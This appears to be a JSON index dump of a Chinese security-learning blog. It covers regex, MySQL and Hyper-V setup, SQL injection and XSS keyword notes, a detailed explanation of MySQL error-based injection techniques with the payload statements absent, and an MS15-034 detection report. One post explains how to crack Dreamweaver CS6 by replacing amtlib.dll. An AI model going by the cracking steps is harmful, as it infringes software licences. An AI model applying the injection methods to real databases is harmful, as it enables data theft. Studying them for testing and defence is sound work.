r元字符r原生字符将在python里有特殊意义的字符如\\b，转换成原生字符（就是去除它在python的特殊意义），不然会给正则表达式有冲突，为了避免这种冲突可以在规则前加原始字符r 打印内容：报错 打印内容：c:\\b 常用的限定符 代码 解释说明 * 重复零次或更多次，优先更多 + 爱重复一次或更多，优先更多 ? 重复零次后一次，优先一次 {} 匹配范围 [] 字符集 *元字符* 元字符 匹配其前面的一个字符0次或多次 打印内容：[‘’, ‘嘤’, ‘’, ‘嘤嘤’, ‘’, ‘嘤嘤嘤’, ‘’] 打印内容：[‘我嘤’, ‘我嘤嘤’,’我嘤嘤嘤’] 打印内容：[‘’,’’,’’,’’,’’,’’,’’,’’,’’,’’]] + 元字符+ 元字符 匹配其前面的一个字符1次或多次 打印内容：[‘嘤’, ‘嘤嘤’, ‘嘤嘤嘤’] 打印内容：[‘嘤嘤’, ‘嘤嘤嘤’] 打印内容：[] ?元字符?元字符 匹配其前面的一个字符0次或1次 打印内容：[‘’, ‘嘤’, ‘’, ‘嘤’, ‘嘤’, ‘’, ‘嘤’, ‘嘤’, ‘嘤’, ‘’] 打印内容：[‘我嘤’,’我嘤’,’我嘤’] 打印内容：[‘’,’’,’’,’’,’’,’’,’’,’’,’’,’’] {}元字符{n}匹配前一个字符n次 打印内容：[‘嘤嘤’,’嘤嘤’] {n,}匹配前一个字符n次或多次 打印内容：[‘嘤’,’嘤嘤’,’嘤嘤嘤’] {n,m}匹配前一个字符n至m次，若省略m，则匹配n至无限次 打印内容：[‘嘤’,’嘤嘤’,’嘤嘤’,’嘤’] {0,}匹配前一个字符0或多次,等同于*元字符{+,}匹配前一个字符1次或无限次,等同于+元字符{0,1}匹配前一个字符0次或1次,等同于?元字符[]元字符[]元字符，字符集需要字符串里完全符合，匹配规则，就匹配，（规则里的[]]元字符）对应位置是[]里的任意一个字符就匹配 打印内容：[‘我是快乐的小’, ‘我是快乐的风’] 函数模块match()函数match，从头匹配一个符合规则的字符串，从起始位置开始匹配，匹配成功返回一个对象，未匹配成功返回Nonematch(pattern, string, flags=0)pattern： 正则模型string ： 要匹配的字符串falgs ： 匹配模式 search()函数search,浏览全部字符串，匹配第一符合规则的字符串，浏览整个字符串去匹配第一个，未匹配成功返回Nonesearch(pattern, string, flags=0)pattern： 正则模型string ： 要匹配的字符串falgs ： 匹配模式注意：match()函数 与 search()函数基本是一样的功能，不一样的就是match()匹配字符串开始位置的一个符合规则的字符串，search()是在字符串全局匹配第一个合规则的字符串 findall()函数findall(pattern, string, flags=0)pattern： 正则模型string ： 要匹配的字符串falgs ： 匹配模式浏览全部字符串，匹配所有合规则的字符串，匹配到的字符串放到一个列表中，未匹配成功返回空列表 注意：一旦匹配成，再次匹配，是从前一次匹配成功的，后面一位开始的，也可以理解为匹配成功的字符串，不在参与下次匹配 打印内容：[‘2b3’, ‘4d5’] #匹配成功的字符串，不再参与下次匹配，所以3c4也符合规则但是没有匹配到注意：如果没写匹配规则，也就是空规则，返回的是一个比原始字符串多一位的，空字符串列表 打印内容：[‘’, ‘’, ‘’, ‘’, ‘’, ‘’, ‘’, ‘’, ‘’] #如果没有写匹配规则，也就是空规则，返回的是一个比原始字符串多一位的空字符串列表，如上是8个字符，返回是9个空字符注意：正则匹配到空字符的情况，如果规则里只有一个组，而组后面是就表示组里的内容可以是0个或者多过，这样组里就有了两个意思，一个意思是匹配组里的内容，二个意思是匹配组里0内容（即是空白）所以尽量避免用否则会有可能匹配出空字符串注意：正则只拿组里最后一位，如果规则里只有一个组，匹配到的字符串里在拿组内容是，拿的是匹配到的内容最后一位 打印内容：[‘ca’, ‘’, ‘’, ‘’, ‘ca’, ‘’, ‘’, ‘’, ‘’, ‘’]#用*号会匹配出空字符 无分组：匹配所有合规则的字符串，匹配到的字符串放到一个列表中 打印内容：[‘a2b3’, ‘aa4d5’]#匹配所有合规则的字符串，匹配到的字符串放入列表 有分组：只将匹配到的字符串里，组的部分放到列表里返回，相当于groups()方法 打印内容：[‘2b3’, ‘a4d5’]#返回匹配到组里的内容返回 多个分组：只将匹配到的字符串里，组的部分放到一个元组中，最后将所有元组放到一个列表里返相当于在group()结果里再将组的部分，分别，拿出来放入一个元组，最后将所有元组放入一个列表返回 打印内容：[(‘a’, ‘2b3’), (‘a’, ‘a4d5’)]#返回的是多维数组 分组中有分组：只将匹配到的字符串里，组的部分放到一个元组中，先将包含有组的组，看作一个整体也就是一个组，把这个整体组放入一个元组里，然后在把组里的组放入一个元组，最后将所有组放入一个列表返回 打印内容：[(‘a’, ‘2b’, ‘b’), (‘a’, ‘a4b’, ‘b’)]#返回的是多维数组 注意:在有分组的情况下findall()函数，不只拿分组里的字符串，拿所有匹配到的字符串，注意?:只用于不是返回正则对象的函数如findall() 打印内容：[‘a2b3’, ‘a4b5’] split()函数根据正则匹配分割字符串，返回分割后的一个列表split(pattern, string, maxsplit=0, flags=0)pattern：正则模型string ：要匹配的字符串maxsplit：指定分割个数flags：匹配模式 打印内容：[‘sdf’, ‘fdf’, ‘sfsf’, ‘sff’] 打印内容：[‘sdf’, ‘fdf’, ‘sfsfafsff’] sub()函数替换匹配成功的指定位置字符串sub(pattern, repl, string, count=0, flags=0)pattern：正则模型repl：要替换的字符串string：要匹配的字符串count：指定匹配个数flags：匹配模式 打印内容：bbbbb subn()函数替换匹配成功的指定位置字符串,并且返回替换次数，可以用两个变量分别接受subn(pattern, repl, string, count=0, flags=0)pattern：正则模型repl ：要替换的字符串string ：要匹配的字符串count ：指定匹配个数flags ：匹配模式"},{"title":"win10 mysql安装","date":"2020-10-22T16:33:55.000Z","url":"/2020/10/22/win10%20mysql%E5%AE%89%E8%A3%85/","tags":[["配置","/tags/%E9%85%8D%E7%BD%AE/"]],"categories":[["环境配置","/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"]],"content":"首先送上mysql压缩包 1.解压后将mysql文件夹移动到C:/Windows/System32 内2.以管理员身份运行命令提示符保证开头为C:/Windows/System323.依次输入 4.输入 PS:由于我之前已经安装了mysql服务，所以系统提示已经存在 5.输入 此时要注意在 root@localhost 后有一串密码一定要记下来！ 6.输入 PS:由于我之前建立了服务 “233”所以系统提示已经存在7.输入 显示MySQL 服务已经启动成功，说明mysql已经成功安装 8.输入 显示输入密码，然后我们就需要输入之前要求记录的密码（注意大小写） 输入后显示Welcome to the MySQL monitor.说明登录成功 9.测试一下发现要求我们修改一下密码输入 这一步我们执行了改密码操作，将密码改为了 root （把root改成别的也可以），以后登录密码就也为root了。再次测试一下发现mysql成功运行。这样我们的mysql就彻底安装完成。PS:以后运行mysql也需要与管理员系统运行命令提示符。"},{"title":"漏洞挖掘时SQL注入漏洞和XSS漏洞需注意的关键字","date":"2020-10-06T23:21:13.000Z","url":"/2020/10/06/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%97%B6SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%92%8CXSS%E6%BC%8F%E6%B4%9E%E9%9C%80%E6%B3%A8%E6%84%8F%E7%9A%84%E5%85%B3%E9%94%AE%E5%AD%97/","tags":[["mysql","/tags/mysql/"]],"categories":[["SQL注入","/categories/SQL%E6%B3%A8%E5%85%A5/"]],"content":"SQL注入漏洞出现位置登录界面、获取HTTP开头(user-agent/client-ip)、订单处理等 普通注入关键字 宽字节注入出现位置文章发表、评论回复、留言、资料设置等 关键字 二次urldecode注入关键字 XSS漏洞关键字"},{"title":"详细解读mysql十二种报错注入","date":"2020-10-01T16:15:00.000Z","url":"/2020/10/01/%E8%AF%A6%E7%BB%86%E8%A7%A3%E8%AF%BBmysql%E5%8D%81%E4%BA%8C%E7%A7%8D%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/","tags":[["报错注入","/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"]],"categories":[["SQL注入","/categories/SQL%E6%B3%A8%E5%85%A5/"]],"content":"使用条件查询不回显内容，会打印错误信息 报错原理报错型注入则是利用了MySQL的第8652号bug ：Bug #8652 group by part of rand() returns duplicate key error来进行的盲注，使得MySQL由于函数的特性返回错误信息，进而我们可以显示我们想要的信息，从而达到注入的效果 mysql语句的特性–子查询在这里虽然语句b有错误，但是由于语句a没有错误所以成功查询出变量A,随后变量A与语句b构成新的语句，又由于语句b存在错误，所以报错时连带着变量A一起报错，从而实现了变量A的查询。 十二种报错注入我将其根据报错原理分成五大类 这里说明一下，在“操作代码”处将语句如下替换查询MySQL版本 查询用户 暴库 爆表 爆列 爆字段 各个例题的数据库为数据库名ctftest 表名users 列名id mane password 字段1 a.name a.password2 b.name b.password3 c.name c.password4 d.name d.password 详细解释通过floor()报错注入函数解释floor() 函数，向下取整rand() 函数，取随机数，若有参数x，则每个x对应一个固定的值，如果连续多次执行会变化，但是可以预测floor( rand( 0 ) * 2 ) 产生的随机序列为011011… 报错原理利用数据库表主键不能重复的原理，使用 GROUP BY 分组，产生主键key冗余，导致报错已知表users如下 ID NAME 1 AA 2 AA 3 BB sql语句 在进行分组运算的时候会根据name属性，创建一个虚拟表 从上至下扫描，当扫描到第一行NAME === AA 的时候 当前虚拟表没有该字段，那么插入此虚拟表，count = 1 count name 1 AA 当扫描到第二行 NAME === AA 的时候 当前虚拟表存在该字段，那么count + 1 count name 2 AA 当扫描到第三行 NAME === BB 的时候 当前虚拟表不存在该字段，执行插入，count = 1 count name 2 AA 1 BB 那么利用floor( rand( 0 ) * 2) 这个函数的返回值，进行分组，因为序列为011011… 那么构建SQL语句 查询第一条记录，别名x 产生 键值0，当键值 0 不存在虚拟表时，执行插入,此时别名x是一个函数，是变量，在执行插入时，按照GROUP BY分组之时 又要执行floor函数，得到1 ，故向虚拟表中插入键值1，count = 1 COUNT x 1 1 查询第二条记录，别名x产生键值1，虚拟表中存在1，则令count + 1 = 2 COUNT x 2 1 查询第三条记录，别名x产生键值0，键值0不存在临时表，执行插入，别名x再次执行得键值1，由于1存在于临时表，那么插入之后如下表所示 COUNT x 2 1 1 1 由于数据库主键唯一性，现在临时表中存在两个键值为1，主键冗余，所以报错 由于数据库报错会将报错原因展示出来，故利用报错来实现注入 由上知，要保证floor报错注入，那么必须保证查询的表必须大于三条数据 约束条件输出字符长度限制为64个字符 注入语句 举例爆库 爆表 爆列 爆字段 通过exp()报错注入函数解释exp()数学函数，用于计算e的x次方的函数。 约束条件5.5&lt;mysql版本&lt;5.6 报错原理exp是以e为底的指数函数， 但是，由于数字太大是会产生溢出。这个函数会在参数大于709时溢出，报错。 将0按位取反就会返回“18446744073709551615”，再加上函数成功执行后返回0的缘故，我们将成功执行的函数取反就会得到最大的无符号BIGINT值。我们通过子查询与按位求反，造成一个DOUBLE overflow error，并借由此注出数据。从而实现了报错注入。 注入语句 举例 通过ExtractValue()报错注入函数解释： extractvalue()：从目标XML中返回包含所查询值的字符串。 EXTRACTVALUE (XML_document, XPath_string); 第一个参数：XML_document是String格式，为XML文档对象的名称 第二个参数：XPath_string (Xpath格式的字符串) concat:返回结果为连接参数产生的字符串。 报错原理例如：SELECT ExtractValue(&#39;&lt;a&gt;&lt;b&gt;&lt;b/&gt;&lt;/a&gt;&#39;, &#39;/a/b&#39;); 就是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。这里就是利用这个特性来获得我们想要知道的内容。 约束条件 输出字符长度限制为32个字符 注入语句 举例 通过UpdateXml()报错注入函数解释：UPDATEXML (XML_document, XPath_string, new_value);第一个参数：XML_document是String格式，为XML文档对象的名称第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。第三个参数：new_value，String格式，替换查找到的符合条件的数据作用：此函数用来更新选定XML片段的内容，将XML标记的给定片段的单个部分替换为 xml_target 新的XML片段 new_xml ，然后返回更 改的XML。xml_target替换的部分 与xpath_expr 用户提供的XPath表达式匹配。如果未xpath_expr找到表达式匹配 ，或者找到多个匹配项，则该函数返回原始 xml_targetXML片段。 报错原理这里和extractvalue函数一样，当Xpath路径语法错误时，就会报错，报错内容含有错误的路径内容。 约束条件 输出字符长度限制为32个字符 注入语句 举例构造注入语句： 发现注入成功，成功爆出版本号。 通过NAME_CONST()报错注入函数解释NAME_CONST(name,value） Returns the given value. When used to produce a result set column, NAME_CONST() causes the column to have the given name. The arguments should be constants. This function is for internal use only. The server uses it when writing statements from stored programs that contain references to local program variables, as described in [Section 19.6, “Binary Logging of Stored Programs”], You might see this function in the output from mysqlbinlog. 报错原理mysql列名重复会导致报错,通过name_const制造一个列 我们可以利用mysql列名重复会导致报错这个原理配合join函数得到列名using 等价 join 中的On 约束条件查询的内容需是定值(约束条件过于苛刻，可操作的内容极其少) 注入语句 举例 通过join报错注入函数解释 约束条件在知到表名的前提下才能操作 注入语句 举例 通过GeometryCollection()报错注入函数解释GeometryCollection是由1个或多个任意类几何对象构成的几何对象。GeometryCollection中的所有元素必须具有相同的空间参考系（即相同的坐标系）。对GeometryCollection的元素无任何限制，但下面介绍的GeometryCollection的子类会限制其成员。这类限制可能基于： 元素类型（例如，MultiPoint可能仅包含Point元素）。 维数 对元素间空间交迭程度的限制 官方文档中举例的用法如下： POINT(x,y) 函数,这是坐标函数，相当于X,Y坐标图上的一点。 LINESTRING(x y,x y)函数,这个函数用来描述直线,两点连成的直线。 报错原理由于MYSQL无法用这样字符串画出图形,所以报错了 约束条件5.5&lt;mysql版本&lt;5.6 注入代码 举例 其他函数报错注入都为空间数据储存函数，其余函数的报错原理与GeometryCollection()原理相同 MYSQL 中的空间数据存储MySQL支持以下数据类型： Geometry:可以存储所有的几何类型 Point:简单点 LINESTRING:简单线 POLYGON:简单面 MULTIPOINT：多点 MULITILINESTRING:多线 MUILITIPOLYGON：很多方面 GEOMETRYCOLLECTION:任何几何集合 约束条件同geometrycollection() 通过polygon ()报错注入代码 通过multipoint ()报错注入代码 通过multlinestring ()报错注入代码 通过multpolygon ()报错注入代码 通过linestring ()报错注入代码"},{"title":"超详细讲解win10 Hyper-V 关闭(禁用)方法[VMware Workstation 与 Device/Credential Guard 不兼容。]","date":"2020-08-14T01:39:31.000Z","url":"/2020/08/13/%E8%B6%85%E8%AF%A6%E7%BB%86%E8%AE%B2%E8%A7%A3win10%20Hyper-V%20%E5%85%B3%E9%97%AD(%E7%A6%81%E7%94%A8)%E6%96%B9%E6%B3%95%5BVMware%20Workstation%20%E4%B8%8E%20Device_Credential%20Guard%20%E4%B8%8D%E5%85%BC%E5%AE%B9%E3%80%82%5D/","tags":[["配置","/tags/%E9%85%8D%E7%BD%AE/"]],"categories":[["环境配置","/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"]],"content":"今天电脑被攻击成功被干废，重做了系统发现之前的系统设置全部被恢复为出厂设置，心态崩了。打开VM虚拟机发现又一次出现了那个亲切的警告“VMware Workstation 与 Device/Credential Guard 不兼容。在禁用 Device/Credential Guard 后，可以运行 VMware Workstati”孩子弱小的心灵又一次受到了严重的打击。首先网络上大多数的解决方式都说有三种方法，实践证明是一种方法，三种操作必须全部进行，我会说明原因。首先进入电脑的控制面板，这里给大家推荐一个小技巧，在电脑任务栏空白处右键单击-&gt;搜索-&gt;显示搜索框，在搜索框内输入 控制面板 即可快速进入控制面板进入控制面板后选择 程序-&gt;启动或关闭windows功能随后找到Hyper-V如果有对勾，那么就取消对勾，取消后会提示重启电脑，此时我们先不需要重启。许多人在完成这个操作后就以为已经将Hyper-V关闭，其实不然。下面我们进行第二步，我们在搜索框内输入 计算机管理服务和应用程序-&gt;服务在服务内找到全部以 Hyper-V 为开头的服务，双击启动类型改为禁用在进行第二步操作时，我们会发现为什么只进行第一步操作不可以，即使我们完成第一步操作，重启电脑，我们来到计算机服务管理我们还是会发现Hype-V还是默认启动的，而且正在运行！完成第二步后即使重启电脑计算机服务管理，正在运行的字样消失了，但是还是会发生冲突，这个具体原因我不清楚，无法解释，所以必须进行第三步操作。第三步，在搜索框内输入 命令提示符 右键 以管理员身份运行，注意，必须以管理员身份运行，win+r 输入cmd的方法不可以，一些网页上教的方法是错误的，进入管理员模式下的命令提示符，输入 回车即可最后我们手动重启电脑，Hyper-V 才会在我们的win10电脑上彻底被禁用。与Hyper冲突的软件除了VM以外，一些PC端的安卓模拟器也会与其发生冲突，二者的原因相同。我之所以写的如此详细以至于每种操作台的打开方式都有所介绍，是为了方便一些计算机小白和一些根本不懂计算机控制命令操作的使用者，网上很多类似的教程只有文字，或者不够详细，为了方便大家，所以创作这篇文章。"},{"title":"PHP开发环境的搭建及编辑工具的破译和使用","date":"2020-08-06T03:26:05.000Z","url":"/2020/08/05/PHP%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA%E5%8F%8A%E7%BC%96%E8%BE%91%E5%B7%A5%E5%85%B7%E7%9A%84%E7%A0%B4%E8%AF%91%E5%92%8C%E4%BD%BF%E7%94%A8/","tags":[["PHP","/tags/PHP/"]],"categories":[["环境配置","/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"]],"content":"一、PHPStudy安装说明1、安装步骤（附截图）(1)百度搜索PHPstudy。 图1.1 (2)进入官网选择合适的版本，设置下载路径，进行下载 。 图1.2 图1.3 (3)解压压缩包，运行程序，设置安装路径，安装PHPstudy。 图1.4 2、启动、停止、重启(1)启动PHPstudy：安装路径会生成一个新的文件夹phpstudy_pro。 图 1.5 进入文件夹phpstudy_pro&gt;COM找到应用程序phpstudy_pro.exe即可启动PHPstudy。 图1.6 图1.7 图1.8 (3)重启Apache，Mysql：如果使用过程中PHP环境出现问题可以尝试重启Apache，Mysql解决问题，按相对应的启按钮即可(参考图1.8) (4)停止Apache，Mysql：按相对应的停止按钮即可(参考图 1.8)3.检测环境是否配置成功(详见Editplus 5使用说明书) 二、EditPlis 5使用说明1.Editplus 5的下载与安装：百度搜索Editplus 5选择合适的版本进行下载并安装。 图 2.1 2.PHP文件的创建与运行(1)新建PHP文件：在目录处找到phpstudy_pro&gt;WWW文件夹(图2.2)，在WWW文件夹下，Editplus 5在左下角空白处右键创(图2.3)，为php文件命名。【注意：①文件尾缀为.php ②文件名只能为英文或拼音】 图 2.2 图 2.3 (2)运行PHP文件：启动Apache，Mysql，在新建的php文件中输入代码(图2.4)并保存文件，打开浏览器，在网址输入栏内输入127.0.0.1/test.php或localhost/test.php回车进入网址(图2.5)，得到输出结果(图 2.6)【注意：输入网址的开头不能有 http://】如果输出结果为hello wirld!说明Apache，Mysql环境配置成功。 图2.4 图2.5 图2.6 三、Dreamweaver CS6使用说明1.Dreamweaver CS6 安装与破译(1)下载所有需要下载的组件链接：提取码：3rc4 (2)解压压缩包，断开网络，运行Dreamweaver_12_LS3Setup.exe，安装Dreamweaver CS6(图2.7)。点击忽略(图2.8)，点击试用(图2.9)完成安装。 图2.7 图2.8 图2.9 (2)启动Dreamweaver CS6发现提醒有试用期限(图2.10)。关闭应用程序，找到 破译补丁&gt;32&gt;amtlib.dll(图2.11)将其复制，比如PS CS6 64bit其目录在“C:\\Program Files\\Adobe\\Adobe Photoshop CS6 (64 Bit)”，找到相应的32bit或64bit文件夹，将“amtlib”覆盖掉相应软件的源文件。再次启动Dreamweaver CS6，发现不再提示试用，且产品注册变成灰色(图2.12)，说明破译成功。 图2.11 图2.12 2.创建HTML文件并运行(1)创建文件：左上角&gt;文件&gt;新建，选择空白页&gt;html&gt;无 创建文件(图2.13)。 图2.13 (3)保存与运行：启动Apache，Mysql，输入需要的代码(图2.14)，另存为(图2.15)，【注意：一定要将文件保存到…/phostudy_pro&gt;WWW 之内】，打开浏览器，在网址输入栏内输入127.0.0.1/test.html或localhost/test.html回车进入网址，得到输出结果(图 2.16)【注意：输入网址的开头不能有 http://】 图2.14 图2.15 图2.16 3.Dreamwear CS6 基本介绍(1)四个视图：①代码(图2.17)显示我们所设计的网页的源码，如果对html熟悉可以直接通过此视图直接设计网页。 图2.17 ②拆分让软件分屏同时显示代码和设计(2.18)或代码和实时视图(2.19),方便操作。 图2.18 图2.19 ③设计(图2.20)从网页层面直观设计网页，比输入代码更加方便快速且出错也会减少，但在网页设计最后通常要用代码来充实细节。 图2.20 ④实时视图(图2.21)直接展现出网页设计的结果，相当于在浏览器内运行。 图2.21 (2)属性面板的使用在视图&gt;设计 之中选择一个元素在DW下方会显示其属性面板，可以直接更改元素的属性，比如更改文字的颜色，大小(图2.22)(图2.23)；更改图片的长宽(图2.24)。不同种类元素的属性面本是不同的。元素的属性也可以直接通过代码更改，但是属性面板更加简便直观(图2.25)。 图2.22 图2.23 图2.24 图2.25 (3)插入-表单插入&gt;表单&gt;表单(图2.26) 即可插入一个表单，也可以通过出入代码的方法插入表单(图2.27) 图2.26 图2.27 (4)插入-表单对象插入表单后进入视图代码，在action中输入表单对象即可插入(图2.28)。 图2.28"},{"title":"技术报告：渗透测试分析","date":"2020-07-26T02:52:25.000Z","url":"/2020/07/25/%E6%8A%80%E6%9C%AF%E6%8A%A5%E5%91%8A%EF%BC%9A%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90/","tags":[["报告","/tags/%E6%8A%A5%E5%91%8A/"]],"categories":[["技术报告","/categories/%E6%8A%80%E6%9C%AF%E6%8A%A5%E5%91%8A/"]],"content":"第1章 绪 论1.1渗透测试的介绍渗透测试是通过实际攻击进行安全测试与评估的方法（Pentratiion Testing,Pentest）,是一种通过模拟恶意攻击的技术与方法挫败目标系统安全措施，取得访问控制权，并发现具备业务影响后果安全隐患的一种安全测试与评估方法。 1.2web渗透测试目前的渗透测试主要是针对web的渗透测试，web渗透测试是从web脚本展开的，但是在整个测试过程中可能要测试四个方面：服务器（Apache、 Nginx、 IIS等），中间件（tomcat、jetty、apache hpptd、JBOSS、webloigc等），数据库（MySQL、SQL Server、数蚕数据库、Oracle数据库等），Web App（Web脚本程序）。 1.3渗透测试工程师1.3.1渗透测试工程师拥有web测试技能的人通常称为渗透测试工程师。 1.3.2渗透测试工程师的技能​ 一是程序员的开发思维，要掌握程序员究竟是如何开发当前应用程序，使用到哪些技术，以及他其中的一些逻辑是怎样来进行的。二是模拟恶意攻击者的思路和方法，通过模拟攻击者的思路和方法，从而达到模拟的效果。三是掌握足够的渗透测试技术，包含：数据库，asp.php.xss 等各种语言，Http等协议、代码审计、web渗透，脚本渗透、java,c++ 等。 第2章 相关技术与基础知识简介2.1web渗透测试步骤1.信息收集；收集目标所拥有的一切信息，包括泄露信息等等。2.整站映射：针对于web脚本将其所有的技术探测到。3.漏洞扫描：利用漏洞扫描器进行扫描，也可以自行编写对应的漏洞扫描器来进行对应的探测。4.漏洞利用：利用扫描到的结果获取权限，还可能需要拓展成果继续提权。5.测试报告：最后为用户提供一个测试报告，报告给出漏洞信息，验证信息，解决方法。 2.2基本渗透测试工具1.HTTP代理：是介于浏览器与服务器直接的中间桥梁，可以通过他来截取对应请求以及响应，同时可以查看对应数据包并进行修改。常用工具：Burpsuite2.网站爬虫：对测试的web app进行整个网站的爬取测试。常用工具：ZAP、Burpsuite、Httrack Python工具：Scrapy3.web漏洞扫描：针对web技术漏洞扫描。 常用工具：Appscan，AWVS Python工具：工具W3af4.目录探测：对web app不链接页面探测。 常用工具：Dirb，wfuzz5.特定任务：需要自动化探测与利用的步骤很多，某些新技术没有探测工具可以用简单高效的编程来开发安全工具,开发以使用Python开发安全工具为首选。 第3章漏洞检测实时演示3.1演示环境本次演示环境为Windows7平台下的PyCharm。检测目标以MS15-034为例。综合严重的等级为严重。如图3-1、图3-2所示：图3-1 MS15-034执行摘要 图3-2 MS15-034漏洞信息 3.2演示步骤3.2.1获取任意代码在搜索到对应的漏洞，找到HTTP请求,如图3-3、图3-4所示： 图3-3在exploit-db内搜查MS15-034 图3-4查找到HTTP请求 3.2.2分析漏洞原因是因为发送了对应的HTTP请求，导致触发漏洞。 3.2.3 导入request模块通过导入模块发送HTTP请求，并接收请求，如图3-5所示：图3-5发送HTTP请求并接收请求 3.2.4搭建测试环境控制面板-&gt;打开或关闭Windows功能-&gt;勾画可承载的web核心以及信息服务，如图3-6、图3-7所示：图3-6搭建测试环境图3-7 80端口开放，IIS开启成功 3.2.5 判断中间件如图3-8、图3-9、图3-10、图3-11所示：图3-8获取IP地址 图3-9替换IP 图3-10获得响应头，发现Server 图3-11输出对应Server并获取值 3.2.6判断IIS值Windows7，Windows2008 IIS是7.5，Windows2012 IIS是8.0为了扫描探测的准确性，我们需探测中间件的IIS值，用remote_serve 来存储对应的中间件，如图3-12、图3-13所示：图3-12探测中间件IIS值 图3-13储存中间件 3.2.7判断server类型如图3-14所示：图3-14 判断server类型 3.2.8扫描漏洞如图3-15所示：图3-15成功发现漏洞MS15-034 3.3源码分析核心代码，如图3-16所示：图3-16 核心代码 3.4与其他工具进行效果对比在linux系统中用kali对ms15-034进行集成，如图3-17所示：图3-17 kali效果对比 返回Target may be vulnerable证明漏洞确实存在，如图3-18所示：图3-18 返回Target may be vulnerable 第4章渗透测试的意义1.渗透测试能够通过识别安全问题来帮助一个单位了解当前的安全状况，促使许多单位开发操作规划来减少攻击或误用的威胁。2.撰写良好的渗透测试结果可以帮助管理人员建立可靠的商业案例，以便证明所增加的安全性预算或者将安全性问题传达到高级管理层。3.安全性不是某时刻的解决方案，而是需要严格评估的一个过程。安全性措施需要进行定期检查，才能发现新的威胁。渗透测试和公正的安全性分析可以使许多单位重视他们最需要的内部安全资源。此外，独立的安全审计也正迅速成为获得网络安全保险的一个要求。4.现在符合规范和法律要求也是执行业务的一个必要条件，渗透测试工具可以帮助许多单位满足这些规范要求。5.启动一个企业电子化项目的核心目标之一，是实现与战略伙伴、提供商、客户和其他电子化相关人员的紧密协作。要实现这个目标，许多单位有时会允许合作伙伴、提供商、B2B 交易中心、客户和其他相关人员使用可信连接方式来访问他们的网络。一个良好执行的渗透测试和安全性审计可以帮助许多单位发现这个复杂结构中的最脆弱链路，并保证所有连接的实体都拥有标准的安全性基线。当拥有安全性实践和基础架构，渗透测试会对商业措施之间的反馈实施重要的验证，同时提供了一个以最小风险而成功实现的安全性框架。"}]